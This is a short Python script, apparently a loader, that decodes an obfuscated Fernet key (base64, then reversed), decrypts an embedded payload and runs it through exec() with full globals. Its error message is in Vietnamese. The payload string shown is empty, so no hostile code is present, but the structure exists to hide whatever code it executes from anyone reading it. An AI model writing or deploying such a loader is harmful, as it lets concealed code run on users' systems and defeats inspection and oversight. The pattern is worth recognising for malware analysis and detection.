import base64
from cryptography.fernet import Fernet
from datetime import datetime as dt

def deobfuscate_key(obfuscated: str) -> bytes:
    return base64.b64decode(obfuscated)[::-1]

def main():
    try:
        key = deobfuscate_key('PTQ3YS0wdDBtZ2dPcENmcXk1T0NLRkRjZUlVTTVWQUNJNHF2d3htd3dkS0w=')
        fernet = Fernet(key)
        encrypted_data = base64.b64decode('')
        decrypted_content = fernet.decrypt(encrypted_data)
        exec(decrypted_content.decode('utf-8'), globals())
    except Exception as e:
        print(f"Lỗi khi giải mã hoặc chạy: {str(e)}")

if __name__ == "__main__":
    main()
